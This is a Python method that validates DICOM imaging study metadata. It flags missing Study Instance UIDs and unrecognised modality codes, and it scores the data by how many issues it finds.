    def _scan_dicom(self, data) -> dict:
        """Scan DICOM metadata for common issues."""
        issues = []
        studies = data if isinstance(data, list) else [data] if isinstance(data, dict) else []
        total = len(studies)

        valid_modalities = {"CT", "MR", "US", "DX", "MG", "PT", "NM", "XA", "CR", "RF"}
        for i, study in enumerate(studies[:50]):
            if not isinstance(study, dict):
                continue
            if not study.get("StudyInstanceUID") and not study.get("study_instance_uid"):
                issues.append(
                    {
                        "severity": "high",
                        "category": "required_field",
                        "resource_type": "Study",
                        "description": f"Study {i}: missing StudyInstanceUID",
                        "fix": "Add DICOM Study Instance UID",
                    }
                )
            modality = study.get("Modality") or study.get("modality")
            if modality and modality not in valid_modalities:
                issues.append(
                    {
                        "severity": "medium",
                        "category": "terminology",
                        "resource_type": "Study",
                        "description": f"Study {i}: unrecognized modality '{modality}'",
                        "fix": f"Use: {', '.join(sorted(valid_modalities))}",
                    }
                )

        issue_count = len(issues)
        high_count = sum(1 for i in issues if i["severity"] == "high")
        score = max(0, min(100, 100 - (high_count * 10) - (issue_count * 3))) if total > 0 else 0

        return {
            "data_type": "dicom",
            "total_resources": total,
            "resource_types": {"Study": total},
            "issues": issues[:50],
            "issue_count": issue_count,
            "score": score,
            "summary": {
                "high": high_count,
                "medium": sum(1 for i in issues if i["severity"] == "medium"),
                "low": sum(1 for i in issues if i["severity"] == "low"),
            },
        }
